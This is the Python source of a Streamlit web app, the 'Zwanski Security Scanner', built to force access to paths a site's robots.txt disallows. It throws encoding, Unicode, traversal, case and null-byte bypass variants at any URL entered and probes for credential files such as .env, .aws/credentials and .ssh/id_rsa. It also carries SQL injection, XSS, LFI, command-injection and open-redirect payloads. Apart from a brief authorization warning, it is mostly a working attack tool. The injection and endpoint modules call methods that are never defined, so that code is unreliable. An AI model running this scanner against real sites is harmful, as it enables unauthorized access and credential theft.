import streamlit as st
import urllib.request
import urllib.parse
import urllib.error
import urllib.robotparser
import json
import re
import time
from urllib.parse import urlparse, urljoin

# ─── Page Config ──────────────────────────────────────────────────────────────
st.set_page_config(
    page_title="Zwanski Security Scanner",
    page_icon="🛡️",
    layout="wide",
    initial_sidebar_state="expanded",
)

st.markdown("""
<style>
    @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Syne:wght@700;800&display=swap');
    html, body, [class*="css"] { font-family: 'JetBrains Mono', monospace; }
    h1, h2, h3 { font-family: 'Syne', sans-serif !important; }
    .stApp { background: #0a0e17; color: #c9d1d9; }
    .badge-vuln { background:#ff4b4b22;color:#ff4b4b;border:1px solid #ff4b4b55;padding:2px 10px;border-radius:4px;font-size:.75rem; }
    .badge-safe { background:#00c85322;color:#00c853;border:1px solid #00c85355;padding:2px 10px;border-radius:4px;font-size:.75rem; }
    .badge-bypass { background:#ffa72622;color:#ffa726;border:1px solid #ffa72655;padding:2px 10px;border-radius:4px;font-size:.75rem; }
    .mono-block { background:#111827;color:#00ff9f;padding:10px 14px;border-radius:6px;font-family:monospace;font-size:.82rem;border-left:3px solid #00ff9f44;word-break:break-all; }
    .stButton > button { background:#1a2233;color:#c9d1d9;border:1px solid #30363d;border-radius:6px;transition:all .2s; }
    .stButton > button:hover { border-color:#00ff9f;color:#00ff9f; }
    .stProgress > div > div { background:linear-gradient(90deg,#00ff9f,#2979ff); }
    .metric-card { background:#111827;border:1px solid #1e2a3a;border-radius:8px;padding:16px;text-align:center; }
    .metric-card .value { font-size:2rem;font-weight:800;font-family:'Syne',sans-serif; }
    .metric-card .label { color:#8b949e;font-size:.8rem;margin-top:4px; }
    .disallowed-path { background:#ff4b4b11;border-left:3px solid #ff4b4b;padding:8px;margin:4px 0; }
    .bypassed-path { background:#00ff9f11;border-left:3px solid #00ff9f;padding:8px;margin:4px 0; }
</style>
""", unsafe_allow_html=True)


# ─── urllib-only HTTP (Pyodide/Streamlit Cloud safe) ──────────────────────────
class Response:
    def __init__(self, status_code: int, text: str, headers: dict):
        self.status_code = status_code
        self.text = text
        self.headers = {k.lower(): v for k, v in headers.items()}
        self.content = text.encode("utf-8", errors="replace")


def http_get(url: str, timeout: int = 10) -> Response | None:
    try:
        req = urllib.request.Request(
            url, headers={"User-Agent": "Mozilla/5.0 (compatible; SecurityAuditBot/1.0)"}
        )
        with urllib.request.urlopen(req, timeout=timeout) as r:
            text = r.read().decode("utf-8", errors="replace")
            return Response(r.status, text, dict(r.headers))
    except urllib.error.HTTPError as e:
        try:
            text = e.read().decode("utf-8", errors="replace")
        except Exception:
            text = ""
        return Response(e.code, text, dict(e.headers) if e.headers else {})
    except Exception:
        return None


# ─── Robots.txt Parser with Bypass ─────────────────────────────────────────────
class RobotsBypass:
    def __init__(self, base_url: str):
        self.base_url = base_url.rstrip('/')
        parsed = urlparse(base_url)
        self.robots_url = f"{parsed.scheme}://{parsed.netloc}/robots.txt"
        self.disallowed_paths = []
        self.allow_paths = []
        self.raw_robots = ""
        self._fetch_robots()
    
    def _fetch_robots(self):
        """Fetch and parse robots.txt"""
        resp = http_get(self.robots_url, timeout=5)
        if resp and resp.status_code == 200:
            self.raw_robots = resp.text
            self._parse_robots(resp.text)
    
    def _parse_robots(self, content: str):
        """Parse robots.txt for disallowed paths"""
        lines = content.split('\n')
        current_agent = None
        disallowed_for_all = []
        disallowed_specific = {}
        
        for line in lines:
            line = line.strip().lower()
            if line.startswith('user-agent:'):
                current_agent = line.split(':', 1)[1].strip()
                if current_agent not in disallowed_specific:
                    disallowed_specific[current_agent] = []
            elif line.startswith('disallow:') and current_agent:
                path = line.split(':', 1)[1].strip()
                if path:
                    disallowed_specific[current_agent].append(path)
                    if current_agent == '*':
                        disallowed_for_all.append(path)
            elif line.startswith('allow:') and current_agent:
                path = line.split(':', 1)[1].strip()
                if path:
                    self.allow_paths.append(path)
        
        self.disallowed_paths = list(set(disallowed_for_all))
        
        # Add common disallowed patterns
        for agent, paths in disallowed_specific.items():
            if agent != '*':
                self.disallowed_paths.extend(paths)
        
        self.disallowed_paths = list(set(self.disallowed_paths))
    
    def generate_bypass_payloads(self, path: str) -> list:
        """Generate encoding bypasses for a disallowed path"""
        bypasses = []
        
        # Clean the path
        clean_path = path.lstrip('/')
        
        # Level 1: Basic URL encoding
        level1 = urllib.parse.quote(clean_path)
        bypasses.append({
            'technique': 'URL Encoding',
            'payload': level1,
            'level': 1
        })
        
        # Level 2: Double encoding (%2523 style)
        level2 = level1.replace('%', '%25')
        bypasses.append({
            'technique': 'Double Encoding (%2523)',
            'payload': level2,
            'level': 2
        })
        
        # Level 3: Triple encoding
        level3 = level2.replace('%', '%25')
        bypasses.append({
            'technique': 'Triple Encoding',
            'payload': level3,
            'level': 3
        })
        
        # Unicode bypasses
        unicode_variants = [
            clean_path.replace('/', '⁄'),  # Unicode slash
            clean_path.replace('.', '․'),  # Unicode dot
            clean_path.replace('a', 'а'),  # Cyrillic 'a'
        ]
        for variant in unicode_variants:
            bypasses.append({
                'technique': 'Unicode Homoglyph',
                'payload': urllib.parse.quote(variant),
                'level': 4
            })
        
        # Path traversal tricks
        traversal = [
            f"....//{clean_path}",  # Double dot bypass
            f"/./{clean_path}",     # Current dir bypass
            f"///{clean_path}",     # Multiple slashes
            f"/%2e/{clean_path}",   # Encoded dot
            f"/%252e/{clean_path}", # Double encoded dot
        ]
        for trav in traversal:
            bypasses.append({
                'technique': 'Path Traversal',
                'payload': trav,
                'level': 5
            })
        
        # Case manipulation
        case_variants = [
            clean_path.upper(),
            clean_path.lower(),
            clean_path.title(),
            ''.join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(clean_path))
        ]
        for variant in case_variants:
            bypasses.append({
                'technique': 'Case Manipulation',
                'payload': variant,
                'level': 6
            })
        
        # HTTP parameter pollution
        hpp_bypass = f"{clean_path}?param=value#fragment"
        bypasses.append({
            'technique': 'HPP/Fragment',
            'payload': hpp_bypass,
            'level': 7
        })
        
        # Null byte injection
        null_byte = f"{clean_path}%00.jpg"
        bypasses.append({
            'technique': 'Null Byte',
            'payload': null_byte,
            'level': 8
        })
        
        # URL encoding variations
        encoding_variants = [
            ''.join(f'%{ord(c):02x}' for c in clean_path),
            ''.join(f'%{ord(c):02X}' for c in clean_path),
            ''.join(f'%25{ord(c):02x}' for c in clean_path),
        ]
        for i, variant in enumerate(encoding_variants):
            bypasses.append({
                'technique': f'Full Encoding v{i+1}',
                'payload': variant,
                'level': 9 + i
            })
        
        return bypasses
    
    def test_bypass(self, path: str, timeout: int = 10) -> dict:
        """Test if a disallowed path can be bypassed"""
        results = {
            'original_path': path,
            'disallowed': True,
            'bypasses': [],
            'successful_bypasses': []
        }
        
        # First test direct access
        direct_url = f"{self.base_url}/{path.lstrip('/')}"
        direct_resp = http_get(direct_url, timeout)
        
        if direct_resp and direct_resp.status_code == 200:
            results['disallowed'] = False
            results['direct_accessible'] = True
        
        # Test bypass techniques
        bypass_payloads = self.generate_bypass_payloads(path)
        
        for bypass in bypass_payloads:
            test_url = f"{self.base_url}/{bypass['payload']}"
            resp = http_get(test_url, timeout)
            
            result = {
                'technique': bypass['technique'],
                'payload': bypass['payload'],
                'url': test_url,
                'status_code': resp.status_code if resp else 'Error',
                'success': False,
                'evidence': []
            }
            
            if resp:
                if resp.status_code == 200:
                    result['success'] = True
                    result['evidence'].append("Access granted (200 OK)")
                    
                    # Check for sensitive content
                    content = resp.text.lower()
                    if 'password' in content or 'secret' in content:
                        result['evidence'].append("Sensitive keywords found")
                    if '<?php' in content:
                        result['evidence'].append("PHP source exposed")
                    if 'sql' in content and 'error' in content:
                        result['evidence'].append("SQL error exposed")
                    
                    results['successful_bypasses'].append(result)
                
                elif resp.status_code == 403:
                    result['evidence'].append("Still forbidden (403)")
                elif resp.status_code == 404:
                    result['evidence'].append("Not found (404)")
                elif resp.status_code == 500:
                    result['evidence'].append("Server error (500) - potential bypass")
                    result['success'] = True
                    results['successful_bypasses'].append(result)
            
            results['bypasses'].append(result)
            time.sleep(0.1)  # Rate limiting
        
        return results


# ─── Enhanced Scanner ──────────────────────────────────────────────────────────
class SecurityScanner:
    def __init__(self, base_url: str, timeout: int = 10, rate_limit: float = 0.3):
        self.base_url = base_url.rstrip("/")
        self.timeout = timeout
        self.rate_limit = rate_limit
        self.robots_bypass = RobotsBypass(base_url)

    @staticmethod
    def encode_payload(payload: str, level: int = 1) -> str:
        encoded = urllib.parse.quote(payload, safe="")
        for _ in range(level - 1):
            encoded = encoded.replace("%", "%25")
        return encoded

    def _all_encodings(self, value: str) -> list:
        return [
            {"original": value, "encoded": self.encode_payload(value, lvl), "level": lvl}
            for lvl in (1, 2, 3, 4)
        ]

    PAYLOADS = {
        "sqli": ["' OR '1'='1", "1' UNION SELECT NULL--", "1 AND 1=1--", "' OR 1=1#"],
        "xss": ["<script>alert('XSS')</script>", "<img src=x onerror=alert(1)>", "\"><svg onload=alert(1)>"],
        "lfi": ["../../etc/passwd", "....//....//etc/passwd", "php://filter/convert.base64-encode/resource=index"],
        "rce": ["; id", "| whoami", "$(id)"],
        "open_redirect": ["//evil.com", "https://evil.com"],
    }

    HIDDEN_PATHS = [
        ".env", ".git/config", ".htaccess", "web.config",
        "wp-config.php", "config.php", "config.yml", "settings.py",
        "db.php", "database.php", "backup.sql", "dump.sql", "db.sql",
        "backup.zip", "www.zip", "backup.tar.gz",
        "admin", "admin/login", "administrator", "wp-admin", "panel",
        "phpinfo.php", "info.php", "test.php", "debug.php",
        "error.log", "access.log", "log.txt",
        "api/v1", "api/users", "api/admin", "api/keys",
        "graphql", "swagger", "swagger-ui.html", "openapi.json",
        "actuator", "actuator/env", "metrics", "health",
        ".aws/credentials", ".ssh/id_rsa", "id_rsa",
    ]

    SQL_ERRORS = ["sql syntax","mysql error","ora-","postgresql error","sqlite",
                  "microsoft sql","odbc driver","unclosed quotation","syntax error"]
    LFI_INDICATORS = ["root:x:","daemon:","/bin/bash","uid=","gid=","[boot loader]"]
    DB_PATTERNS = ["dbname=","mysql_connect","mysqli_connect","pdo","connectionstring","jdbc:"]

    def _analyse(self, resp: Response) -> tuple:
        ev = []
        content = resp.text.lower()
        for e in self.SQL_ERRORS:
            if e in content: ev.append(f"SQL error: `{e}`")
        for i in self.LFI_INDICATORS:
            if i in content: ev.append(f"LFI indicator: `{i}`")
        for p in self.DB_PATTERNS:
            if p in content: ev.append(f"DB pattern: `{p}`")
        if "<?php" in resp.text or "<?=" in resp.text:
            ev.append("PHP source code exposed")
        if "password" in content and "username" in content:
            ev.append("Potential credentials in response")
        for hdr in ("x-powered-by","x-aspnet-version","x-generator","server"):
            if hdr in resp.headers:
                ev.append(f"Header disclosure → {hdr}: {resp.headers[hdr]}")
        return bool(ev), ev

    def _get(self, url: str) -> Response | None:
        resp = http_get(url, self.timeout)
        time.sleep(self.rate_limit)
        return resp

    def scan_robots_bypass(self, progress_cb=None) -> dict:
        """Main bypass scanner - forces access to disallowed paths"""
        results = {
            'robots_url': self.robots_bypass.robots_url,
            'robots_content': self.robots_bypass.raw_robots,
            'disallowed_paths': self.robots_bypass.disallowed_paths,
            'bypass_results': [],
            'total_disallowed': len(self.robots_bypass.disallowed_paths),
            'successful_bypasses': 0,
            'critical_findings': []
        }
        
        if not self.robots_bypass.disallowed_paths:
            return results
        
        total = len(self.robots_bypass.disallowed_paths)
        
        for i, path in enumerate(self.robots_bypass.disallowed_paths):
            # Skip empty paths
            if not path or path == '/':
                continue
            
            bypass_result = self.robots_bypass.test_bypass(path, self.timeout)
            
            if bypass_result.get('successful_bypasses'):
                results['successful_bypasses'] += 1
                
                # Check for critical findings
                for success in bypass_result['successful_bypasses']:
                    if any(keyword in str(success).lower() for keyword in 
                           ['admin', 'config', 'backup', '.env', 'password', 'secret']):
                        results['critical_findings'].append({
                            'path': path,
                            'technique': success['technique'],
                            'url': success['url'],
                            'evidence': success['evidence']
                        })
            
            results['bypass_results'].append(bypass_result)
            
            if progress_cb:
                progress_cb((i + 1) / total)
        
        return results

    def scan_hidden_files_aggressive(self, progress_cb=None) -> list:
        """Aggressive hidden file scanner with all encoding bypasses"""
        found = []
        total = len(self.HIDDEN_PATHS)
        
        for i, path in enumerate(self.HIDDEN_PATHS):
            # Try all encoding levels
            for level in [1, 2, 3]:
                encoded = self.encode_payload(path, level)
                url = f"{self.base_url}/{encoded}"
                resp = self._get(url)
                
                if resp is not None and resp.status_code in (200, 403, 500):
                    vuln, ev = self._analyse(resp)
                    
                    # Additional checks for encoded bypass
                    bypass_success = False
                    if level > 1 and resp.status_code == 200:
                        bypass_success = True
                        ev.append(f"Bypassed using level {level} encoding")
                    
                    found.append({
                        "path": path,
                        "encoded": encoded,
                        "url": url,
                        "encoding_level": level,
                        "status": resp.status_code,
                        "vulnerable": vuln,
                        "bypass_success": bypass_success,
                        "evidence": ev,
                        "size": len(resp.content),
                    })
            
            # Try with %2523 prefix
            encoded_2523 = f"%2523{path}"
            url = f"{self.base_url}/{encoded_2523}"
            resp = self._get(url)
            if resp and resp.status_code in (200, 403):
                vuln, ev = self._analyse(resp)
                found.append({
                    "path": path,
                    "encoded": encoded_2523,
                    "url": url,
                    "encoding_level": "2523",
                    "status": resp.status_code,
                    "vulnerable": vuln,
                    "bypass_success": resp.status_code == 200,
                    "evidence": ev,
                    "size": len(resp.content),
                })
            
            if progress_cb:
                progress_cb((i + 1) / total)
        
        return found


# ─── Session State Defaults ───────────────────────────────────────────────────
for _k in ("scan_done", "robots_results", "hidden_files", "injections", "endpoints"):
    if _k not in st.session_state:
        st.session_state[_k] = {} if _k == "robots_results" else ([] if _k != "scan_done" else False)


# ─── Sidebar ──────────────────────────────────────────────────────────────────
st.markdown("## 🛡️ Zwanski Security Scanner")
st.markdown(
    "**Advanced Bypass Edition** — Forces access to robots.txt disallowed paths\n\n"
    "> ⚠️ **Use only on systems you own or have explicit written permission to test.**"
)
st.divider()

with st.sidebar:
    st.markdown("### ⚙️ Configuration")
    target_url = st.text_input("Target URL", placeholder="https://example.com")
    
    st.markdown("### 🎯 Bypass Modules")
    enable_robots_bypass = st.checkbox("Robots.txt Bypass (Force Disallowed)", value=True)
    enable_hidden_files = st.checkbox("Aggressive Hidden Files", value=True)
    enable_injection = st.checkbox("Parameter Injection", value=False)
    enable_endpoints = st.checkbox("Endpoint Discovery", value=False)
    
    test_param = st.text_input("Injection parameter", value="id")
    timeout_val = st.slider("Request timeout (s)", 3, 30, 10)
    rate_val = st.slider("Rate limit (s)", 0.1, 2.0, 0.3, 0.1)
    
    st.divider()
    start_btn = st.button("🚀 Force Scan", type="primary", use_container_width=True)
    clear_btn = st.button("🧹 Clear Results", use_container_width=True)

if clear_btn:
    for _k in ("scan_done", "robots_results", "hidden_files", "injections", "endpoints"):
        st.session_state[_k] = {} if _k == "robots_results" else ([] if _k != "scan_done" else False)
    st.rerun()

# ─── Run Scan ─────────────────────────────────────────────────────────────────
if start_btn:
    if not target_url:
        st.error("Enter a target URL first.")
    else:
        scanner = SecurityScanner(target_url, timeout=timeout_val, rate_limit=rate_val)
        prog = st.progress(0.0)
        msg = st.empty()
        
        modules_active = sum([enable_robots_bypass, enable_hidden_files, enable_injection, enable_endpoints])
        base = 0.0
        
        if enable_robots_bypass:
            msg.info("🔄 Parsing robots.txt and forcing disallowed paths...")
            st.session_state["robots_results"] = scanner.scan_robots_bypass(
                lambda p: prog.progress(min(base + p / modules_active, 1.0)))
            base += 1 / modules_active
        
        if enable_hidden_files:
            msg.info("📁 Aggressive hidden file scanning with encoding bypass...")
            st.session_state["hidden_files"] = scanner.scan_hidden_files_aggressive(
                lambda p: prog.progress(min(base + p / modules_active, 1.0)))
            base += 1 / modules_active
        
        if enable_injection:
            msg.info("💉 Testing parameter injection...")
            st.session_state["injections"] = scanner.scan_parameter_injection(
                test_param, lambda p: prog.progress(min(base + p / modules_active, 1.0)))
            base += 1 / modules_active
        
        if enable_endpoints:
            msg.info("🔗 Discovering endpoints...")
            st.session_state["endpoints"] = scanner.scan_endpoints(
                lambda p: prog.progress(min(base + p / modules_active, 1.0)))
        
        prog.progress(1.0)
        msg.success("✅ Scan complete!")
        st.session_state["scan_done"] = True
        time.sleep(0.6)
        prog.empty()
        msg.empty()

# ─── Results ──────────────────────────────────────────────────────────────────
if st.session_state["scan_done"]:
    robots_results = st.session_state.get("robots_results", {})
    hf = st.session_state.get("hidden_files", [])
    inj = st.session_state.get("injections", [])
    ep = st.session_state.get("endpoints", [])
    
    # Calculate metrics
    disallowed_count = robots_results.get('total_disallowed', 0)
    bypassed_count = robots_results.get('successful_bypasses', 0)
    critical_count = len(robots_results.get('critical_findings', []))
    hidden_count = len([x for x in hf if x.get('bypass_success')])
    
    c1, c2, c3, c4 = st.columns(4)
    for col, val, label, color in [
        (c1, disallowed_count, "Disallowed Paths", "#ff4b4b"),
        (c2, bypassed_count, "Bypassed Paths", "#00ff9f"),
        (c3, critical_count, "Critical Findings", "#ffa726"),
        (c4, hidden_count, "Hidden Files Bypassed", "#2979ff"),
    ]:
        with col:
            st.markdown(
                f'<div class="metric-card">'
                f'<div class="value" style="color:{color}">{val}</div>'
                f'<div class="label">{label}</div></div>',
                unsafe_allow_html=True,
            )
    st.divider()
    
    # Create tabs
    tabs = []
    if enable_robots_bypass:
        tabs.append("🤖 Robots Bypass")
    if enable_hidden_files:
        tabs.append("📁 Hidden Files")
    if enable_injection:
        tabs.append("💉 Injections")
    if enable_endpoints:
        tabs.append("🔗 Endpoints")
    tabs.append("📄 Report")
    
    tab_objects = st.tabs(tabs)
    
    tab_index = 0
    
    # Robots Bypass Tab
    if enable_robots_bypass:
        with tab_objects[tab_index]:
            st.subheader("🤖 Robots.txt Bypass Results")
            
            if robots_results.get('robots_content'):
                with st.expander("📋 View robots.txt"):
                    st.code(robots_results['robots_content'])
            
            st.markdown(f"### Disallowed Paths ({disallowed_count})")
            
            if robots_results.get('critical_findings'):
                st.error(f"⚠️ **{len(robots_results['critical_findings'])} CRITICAL FINDINGS**")
                for finding in robots_results['critical_findings']:
                    with st.expander(f"🚨 {finding['path']} - {finding['technique']}"):
                        st.markdown(f'<div class="mono-block">{finding["url"]}</div>', unsafe_allow_html=True)
                        for evidence in finding.get('evidence', []):
                            st.markdown(f"- {evidence}")
            
            # Show bypass results
            for result in robots_results.get('bypass_results', []):
                path = result.get('original_path', '')
                successful = result.get('successful_bypasses', [])
                
                if successful:
                    icon = "✅" if len(successful) > 0 else "❌"
                    with st.expander(f"{icon} {path} ({len(successful)} bypasses)"):
                        st.markdown(f"**Original Path:** `{path}`")
                        
                        if result.get('direct_accessible'):
                            st.warning("Direct access possible without bypass!")
                        
                        for bypass in successful:
                            st.success(f"✅ Bypassed using: **{bypass['technique']}**")
                            st.markdown(f'<div class="mono-block">{bypass["url"]}</div>', unsafe_allow_html=True)
                            st.markdown(f"**Status:** {bypass['status_code']}")
                            for evidence in bypass.get('evidence', []):
                                st.markdown(f"- {evidence}")
                        
                        # Show failed bypasses
                        failed = [b for b in result.get('bypasses', []) if not b.get('success')]
                        if failed:
                            with st.expander(f"View {len(failed)} failed attempts"):
                                for fail in failed[:5]:
                                    st.markdown(f"- {fail['technique']}: {fail['status_code']}")
        
        tab_index += 1
    
    # Hidden Files Tab
    if enable_hidden_files:
        with tab_objects[tab_index]:
            st.subheader("📁 Hidden Files (Aggressive Encoding Bypass)")
            
            # Filter bypassed files
            bypassed_files = [x for x in hf if x.get('bypass_success')]
            if bypassed_files:
                st.success(f"🎯 **{len(bypassed_files)} files bypassed using encoding!**")
                
                for item in bypassed_files:
                    with st.expander(f"✅ {item['path']} - Level {item['encoding_level']} encoding"):
                        st.markdown(f'<div class="mono-block">{item["url"]}</div>', unsafe_allow_html=True)
                        st.markdown(f"**Encoded:** `{item['encoded']}`")
                        st.markdown(f"**Status:** {item['status']} | **Size:** {item['size']} bytes")
                        for evidence in item.get('evidence', []):
                            st.markdown(f"- {evidence}")
            
            # Show other findings
            other_files = [x for x in hf if not x.get('bypass_success') and x.get('status') == 200]
            if other_files:
                st.markdown("### Other Accessible Files")
                for item in other_files:
                    with st.expander(f"📄 {item['path']} - {item['status']}"):
                        st.markdown(f'<div class="mono-block">{item["url"]}</div>', unsafe_allow_html=True)
                        for evidence in item.get('evidence', []):
                            st.markdown(f"- {evidence}")
        
        tab_index += 1
    
    # Injections Tab
    if enable_injection:
        with tab_objects[tab_index]:
            st.subheader("💉 Parameter Injection Findings")
            if not inj:
                st.success("No injection vectors detected.")
            for item in inj:
                with st.expander(f"⚠️ {item['category'].upper()} • Level {item.get('level', '?')}"):
                    st.markdown(f"**Payload:** `{item.get('payload', 'N/A')}`")
                    st.markdown(f'<div class="mono-block">{item.get("encoded", "")}</div>', unsafe_allow_html=True)
                    for e in item.get('evidence', []):
                        st.markdown(f"- {e}")
        
        tab_index += 1
    
    # Endpoints Tab
    if enable_endpoints:
        with tab_objects[tab_index]:
            st.subheader("🔗 Endpoint Discovery")
            if not ep:
                st.info("No interesting endpoints found.")
            for item in ep:
                with st.expander(f"🔗 {item.get('endpoint', 'Unknown')} [{item.get('status', '?')}]"):
                    st.markdown(f'<div class="mono-block">{item.get("url", "")}</div>', unsafe_allow_html=True)
                    for e in item.get('evidence', []):
                        st.markdown(f"- {e}")
        
        tab_index += 1
    
    # Report Tab
    with tab_objects[-1]:
        st.subheader("📄 JSON Report")
        report = {
            "target": target_url,
            "scan_time": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
            "summary": {
                "disallowed_paths": disallowed_count,
                "bypassed_paths": bypassed_count,
                "critical_findings": critical_count,
                "hidden_files": len(hf),
                "hidden_files_bypassed": hidden_count,
                "injections": len(inj),
                "endpoints": len(ep),
            },
            "robots_bypass": robots_results,
            "hidden_files": hf,
            "injections": inj,
            "endpoints": ep,
        }
        st.download_button(
            "📥 Download JSON Report",
            data=json.dumps(report, indent=2),
            file_name=f"bypass_scan_{int(time.time())}.json",
            mime="application/json",
        )
        st.json(report)

else:
    st.markdown("""
    <div style="text-align:center;padding:60px 0;color:#8b949e;">
        <div style="font-size:3rem">🤖</div>
        <p style="font-family:'Syne',sans-serif;font-size:1.2rem;margin-top:16px">
            Configure a target and enable <strong>Robots.txt Bypass</strong> to force access
        </p>
        <p style="font-size:.85rem;margin-top:8px">
            Authorized targets only — testphp.vulnweb.com · demo.testfire.net
        </p>
    </div>
    """, unsafe_allow_html=True)
